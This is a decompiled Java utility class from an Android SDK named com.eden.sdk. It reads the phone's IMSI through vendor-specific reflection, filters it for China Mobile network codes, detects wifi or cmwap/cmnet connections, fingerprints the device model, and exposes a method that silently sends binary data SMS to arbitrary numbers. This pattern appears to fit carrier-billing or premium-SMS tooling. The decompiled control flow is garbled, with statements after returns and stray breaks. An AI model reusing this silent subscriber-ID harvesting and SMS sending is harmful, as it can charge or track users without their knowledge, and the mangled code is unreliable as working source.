package com.eden.sdk.util;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Build.VERSION;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import java.lang.reflect.Method;

public class Util
{
  private static Uri a = Uri.parse("content://telephony/carriers/preferapn");
  private static WifiManager b = null;
  private static WifiInfo c;
  
  public Util() {}
  
  private static int a()
  {
    try
    {
      int i = Integer.valueOf(Build.VERSION.SDK).intValue();
      return i;
    }
    catch (NumberFormatException localNumberFormatException) {}
    return 1;
  }
  
  private static int a(String paramString)
  {
    if ((paramString != null) && (paramString.length() >= 5))
    {
      paramString = (String)paramString.subSequence(3, 5);
      if ((paramString.equals("00")) || (paramString.equals("02")) || (paramString.equals("07")) || (paramString.equals("08"))) {
        return 1;
      }
      return 0;
    }
    return 2;
  }
  
  public static String getIMSI(Context paramContext)
  {
    Object localObject5 = (TelephonyManager)paramContext.getSystemService("phone");
    if (((TelephonyManager)localObject5).getSimState() == 5) {}
    Object localObject2;
    for (Object localObject1 = ((TelephonyManager)localObject5).getSubscriberId();; localObject2 = null)
    {
      if ((localObject1 != null) && (a((String)localObject1) == 1)) {}
      for (;;)
      {
        return localObject1;
        Object localObject4;
        try
        {
          Object localObject3 = Class.forName("com.mediatek.telephony.TelephonyManagerEx");
          Object localObject6 = ((Class)localObject3).getDeclaredMethod("getDefault", new Class[0]).invoke(null, new Object[0]);
          localObject3 = (String)((Class)localObject3).getDeclaredMethod("getSubscriberId", new Class[] { Integer.TYPE }).invoke(localObject6, new Object[] { Integer.valueOf(1) });
          if ((localObject3 != null) && (a((String)localObject3) == 1)) {
            return localObject3;
          }
        }
        catch (Exception localException2)
        {
          for (;;)
          {
            localException2.printStackTrace();
            localObject4 = localObject1;
          }
          localObject1 = localObject4;
          if (!javaGetUserAgent().startsWith("lenovo_s868t_android")) {}
        }
        try
        {
          localObject5 = (String)Class.forName("android.telephony.TelephonyManager").getDeclaredMethod("getSubscriberIdMSMS", new Class[] { Integer.TYPE }).invoke(localObject5, new Object[] { Integer.valueOf(1) });
          localObject1 = localObject5;
          if (localObject5 == null) {
            localObject1 = localObject5;
          }
        }
        catch (Exception localException1)
        {
          try
          {
            for (;;)
            {
              localObject4 = Class.forName("android.telephony.TelephonyManager2").getDeclaredMethod("getSubscriberId", new Class[0]);
              paramContext = paramContext.getSystemService("phone2");
              paramContext = (String)((Method)localObject4).invoke(paramContext, new Object[0]);
              if (paramContext != null)
              {
                localObject1 = paramContext;
                if (a(paramContext) == 1) {
                  break;
                }
              }
              return null;
              localException1 = localException1;
              localException1.printStackTrace();
              localObject2 = localObject4;
            }
          }
          catch (Exception paramContext)
          {
            for (;;)
            {
              paramContext.printStackTrace();
              paramContext = localObject2;
            }
          }
        }
      }
    }
  }
  
  public static int javaGetNetworkType(Context paramContext)
  {
    Object localObject1 = null;
    Log.e("LLWW", "javaGetNetworkType: start");
    Object localObject2 = (WifiManager)paramContext.getSystemService("wifi");
    b = (WifiManager)localObject2;
    c = ((WifiManager)localObject2).getConnectionInfo();
    localObject2 = ((ConnectivityManager)paramContext.getSystemService("connectivity")).getActiveNetworkInfo();
    if ((b.isWifiEnabled()) && (c.getNetworkId() != -1) && (c.getSSID() != null) && (localObject2 != null) && (((NetworkInfo)localObject2).isConnected()) && (((NetworkInfo)localObject2).getType() == 1))
    {
      Log.e("LLWW", "javaGetNetworkType:0");
      return 0;
    }
    Log.e("LLWW", "javaGetNetworkType: start-1");
    localObject2 = ((ConnectivityManager)paramContext.getSystemService("connectivity")).getNetworkInfo(0);
    Log.e("LLWW", "javaGetNetworkType: start-2");
    if (a() < 17)
    {
      Log.e("LLWW", "javaGetNetworkType: start-2.5");
      localObject2 = paramContext.getContentResolver().query(a, null, null, null, null);
      paramContext = null;
      while (localObject2 != null)
      {
        try
        {
          i = ((Cursor)localObject2).getColumnIndex("apn");
          localObject1 = paramContext;
          if (i >= 0) {
            localObject1 = ((Cursor)localObject2).getString(i);
          }
        }
        catch (Exception localException)
        {
          for (;;)
          {
            int i;
            Context localContext = paramContext;
          }
        }
        Log.e("LLWW", "javaGetNetworkType: start-3");
        paramContext = (Context)localObject1;
        if (!((Cursor)localObject2).moveToNext()) {
          paramContext = (Context)localObject1;
        }
      }
    }
    for (;;)
    {
      Log.e("LLWW", "javaGetNetworkType: start-5");
      if ((paramContext != null) && (paramContext.length() > 0) && (paramContext.toLowerCase().contains("wap"))) {}
      for (i = 1;; i = 2)
      {
        Log.e("LLWW", "javaGetNetworkType:" + i);
        return i;
        paramContext = (Context)localObject1;
        if (localObject2 == null) {
          break;
        }
        paramContext = (Context)localObject1;
        if (((NetworkInfo)localObject2).getExtraInfo() == null) {
          break;
        }
        Log.e("LLWW", "javaGetNetworkType: start-4");
        if ((((NetworkInfo)localObject2).getExtraInfo().equals("cmnet")) && (((NetworkInfo)localObject2).isConnected()))
        {
          paramContext = "cmnet";
          break;
        }
        paramContext = (Context)localObject1;
        if (!((NetworkInfo)localObject2).getExtraInfo().equals("cmwap")) {
          break;
        }
        paramContext = (Context)localObject1;
        if (!((NetworkInfo)localObject2).isConnected()) {
          break;
        }
        paramContext = "cmwap";
        break;
      }
    }
  }
  
  public static String javaGetUserAgent()
  {
    return (Build.BRAND + "_" + Build.MANUFACTURER + "_" + Build.MODEL).replace(" ", "_");
  }
  
  public static void javaSendSMS(String paramString1, String paramString2)
  {
    if ((paramString1 == null) || (paramString2 == null)) {
      return;
    }
    SmsManager.getDefault().sendDataMessage(paramString1, null, (short)0, paramString2.getBytes(), null, null);
  }
}
